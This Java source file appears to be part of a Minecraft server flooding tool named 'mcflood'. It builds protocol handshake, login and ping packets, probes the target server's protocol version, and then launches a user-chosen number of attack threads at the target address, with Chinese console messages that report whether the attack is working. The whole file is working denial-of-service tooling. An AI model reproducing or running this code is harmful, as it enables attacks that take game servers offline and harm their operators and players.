package me.xiaozhangup.mcflood;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;

import java.io.*;
import java.net.Socket;
import java.util.Scanner;

public class Runner {
    public static byte[] hand;
    public static byte[] login;
    public static byte[] ping;
    public static byte[] pack;
    public static int version = -1;

    public static void loadThread(int num, Scanner s) {
        ByteArrayOutputStream b;
        DataOutputStream handshake;
        //第一次握手
        try {
            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x00);
            MCFlood.writeVarInt(handshake, -1);//版本号未知
            MCFlood.writeVarInt(handshake, MCFlood.part1[0].length()); //ip地址长度
            handshake.writeBytes(MCFlood.part1[0]); //ip
            handshake.writeShort(MCFlood.port); //port
            MCFlood.writeVarInt(handshake, 1); //state (1 for handshake)
            hand = b.toByteArray();

            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x01);
            handshake.writeLong(Long.MAX_VALUE);
            ping = b.toByteArray();

            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x00);
            pack = b.toByteArray();

        } catch (IOException e) {
            // TODO 自动生成的 catch 块
            e.printStackTrace();
        }//先握手

        System.out.println("正在探测版本..");
        boolean lock = true;
        try {
            Socket s1 = new Socket(MCFlood.part1[0], MCFlood.port);
            //流准备
            InputStream is = s1.getInputStream();
            DataInputStream di = new DataInputStream(is);
            OutputStream os = s1.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);

            //握手
            MCFlood.writeVarInt(dos, hand.length); //prepend size
            dos.write(hand); //write handshake packet
            //跟小包
            MCFlood.writeVarInt(dos, pack.length); //prepend size
            dos.write(pack); //write handshake packet
            dos.flush();

            MCFlood.data = MCFlood.data + MCFlood.readVarInt(di);//读包大小
            MCFlood.readVarInt(di);
            byte[] temp1 = new byte[MCFlood.readVarInt(di)];
            di.readFully(temp1);

            String motdT = new String(temp1);
            JsonParser json = new JsonParser();
            JsonElement part5 = json.parse(motdT);
            JsonElement part6 = part5.getAsJsonObject().get("version");
            System.out.println("服务器版本:" + part6.getAsJsonObject().get("name").getAsString() + ",协议版本号:" + part6.getAsJsonObject().get("protocol").getAsInt());
            version = part6.getAsJsonObject().get("protocol").getAsInt();

            di.close();
            is.close();
            dos.close();
            os.close();
            s1.close();
        } catch (Exception e) {
            lock = false;
            e.printStackTrace();
            System.out.print("探测失败，请手动输入协议版本号:");
            version = Integer.parseInt(s.nextLine());
        }
        if (lock) {
            if (!MCFlood.fastmode) {
                System.out.print("刚才探测到的是否是真的协议版本号？[y/n]:");
                String temp = s.nextLine();
                if ((!temp.equals("y")) && (!temp.equals("Y"))) {
                    System.out.print("请输入正确的协议版本号:");
                    version = Integer.parseInt(s.nextLine());
                }
            }
        }
        try {
            b = new ByteArrayOutputStream();
            handshake = new DataOutputStream(b);
            handshake.write(0x00);
            MCFlood.writeVarInt(handshake, version);//版本号未知
            MCFlood.writeVarInt(handshake, MCFlood.part1[0].length()); //ip地址长度
            handshake.writeBytes(MCFlood.part1[0]); //ip
            handshake.writeShort(MCFlood.port); //port
            MCFlood.writeVarInt(handshake, 2); //state (1 for handshake)
            login = b.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("准备完毕,正在启动线程,长时间显示\"[AnotherThread]>0byte\"信息则为攻击失败");
        Runnable thread4 = new ReportThread();
        Thread thread3 = new Thread(thread4);
        thread3.start();//启动解析线程
        for (int i = 1; i <= num; i++) {
            Runnable thread1 = new AttackThread();
            Thread thread2 = new Thread(thread1);
            thread2.start();//启动解析线程
        }
        System.out.println("所有的线程已经启动完毕! 总计有 " + num + " 个线程被启动");
    }
}
